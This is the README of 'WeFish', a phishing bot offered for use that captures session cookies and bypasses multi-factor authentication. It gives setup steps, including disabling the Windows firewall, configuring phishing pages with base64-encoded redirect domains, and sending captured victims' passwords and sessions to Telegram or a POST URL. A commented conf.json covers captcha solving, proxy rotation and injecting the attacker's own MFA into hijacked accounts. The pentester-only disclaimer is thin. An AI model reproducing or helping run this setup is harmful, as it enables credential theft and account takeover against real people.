<h3>WeFish</h3>
Beyond capturing cookies phishing bot.

<b>Disclaimer:</b> Available exclusively to the owners or employees of legitimate penetration testing companies.

<a href="https://youtu.be/jxaWM2DuoBg">YouTube Demo</a><br>
<a href="https://t.me/wefishboat">Telegram Channel</a>

<p>WeFish is highly customizable and goes beyond cookie capture. It supports own MFA injection, proxying true visitor IPs, and sending reports via dashboard and Telegram. 
  It runs multiple pages at once — all without extra setup.</p>
<p>It bypasses MFA methods like push, SMS, call, app, QR scan, and browser links. More features can be included.</p>

   
 <h3>Running WeFish</h3>
    <ol>
      <li>Unzip the WeFish file.</li>
      <li>Run <code>WeFish.exe</code>.</li>
    </ol>

<h3>Getting SSL</h3>
<ol>
  <li>Download win-acme from <a href="https://www.win-acme.com/" target="_blank">win-acme.com</a>.</li>
  <li>Unzip it and create an <code>ssl</code> folder.</li>
  <li>Turn of Windows defender firewall on private and public network.</li>
  <li>Run win-acme and follow the instructions carefully.</li>
  <li>Rename <code>domainname.cert.pem</code> to <code>crt.pem</code> and <code>domainname.key.pem</code> to <code>key.pem</code>.</li>
  <li>Copy the <code>ssl</code> folder into the WeFish directory.</li>
</ol>

 <h3>Pages</h3>
      <p>To use WeFish live mode, after you point domain to vps and add ssl.
         <br>Upload your page to cpanel, set your cpanel domain in conf.json <code>allowedRefera : [ "https://exampledomain.com/" ] ,</code>.
         <br>In the html file which you upload to cpanel, check for rt and rd input elements close to the title tag. 
         <br>Change the rt input value to vps domain name in base64.
         <br>Change the rd input value to your referred domain in base64. 
         <br>use <a href="https://base64.guru/converter/encode/text">https://base64.guru/converter/encode/text</a> to encode text to url
      </p>

<img src="https://imgbob.net/ib/j670eJLsIzNwuGb_1763382763.png" style="width: 50%;" alt="pgimg">


 <h3>Reports</h3>
      <ul>
        <li><strong>Telegram:</strong> Set <code>telegram</code> to <code>true</code> on line 7. Add your <code>botToken</code> and <code>chatid</code>.</li>
        <li><strong>Email:</strong> Coming soon.</li>
        <li><strong>POST URL:</strong> Set <code>url</code> to <code>true</code> on line 8. Set <code>purl</code> on line 18.</li>
      </ul>

<h3>Admin</h3>
      <p>Access the dashboard at <code>https://urdomain.com/zp</code>. <br>Enter the first and last 4 digits of your license key in the input fields and "click me".</p>

  <h3>conf.json structure</h3>
  <pre>
"key": "10000100001111", /WeFish Bot license key.
"port": 80,
"ssl_cert": "crt.pem", //ssl cert file from win-acme.
"ssl_key": "key.pem", //ssl key file.
   
   "debugMode": true, //set to false when going live.
   "allowedRefera": [ "No referrer"], //allow which domain WeFish should accept request from. can be single or multiple, ["http:///domain1.com", "https://domain2.org" ].

   "sessionTimeout": 180000, //set how long idle or succesfully captured session should stay before before closing, 180000 is 3 mins.
   "headless": false, //set to false to see a mini browser where victims info are processed.
   "strictAutograb": false, //strictly accept connection only from emails/ids in a give .txt list, still in test mode do not use!!!.
   "reportInvalidPwd": true, //Reports invalid password to telegram or dashboard.
   "reportInvalidEm": true, 
   "noAuth_cookie": false, //capture cookies of accounts with no security.
   "blockPhone": false, //under development.
   "rateLimit": 10, //how many request a single ip address can send to before gettin blocked.
   "useDir": false,//use a directory, recommended.
   "userAgents": ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.107.36 Safari/537.36" ],  
   //list of user agents used by WeFish, you can add urs, but carefully test it to avoid errors.

   "captchaAPIKey": "",
   "captchaAPIID":"2captcha",
   "useCaptchaSolver": false,
     
   "telegram": false, //set to true to receive reports on telegram.
   "botToken": "", //telegram bot token.
   "chatId": "",  //telegram chat id.

   "useProxy": false, //set to true to use proxy
   "ProxyServa": "", //proxy host and post, example proxy.pro.com:3000
   "ProxyUser": "package-user-country-", //proxy username.
   "ProxyPwd": "", //proxy password.
   "ProxyVisitorLocation": false, //proxy visitor location. if u use soax proxy, set it to ratating. add user-name-country- to proxy user.
   "addMfa": true //add own mfa after succesfully capturing. under testing. works for facebook alone at the moment.

</pre>
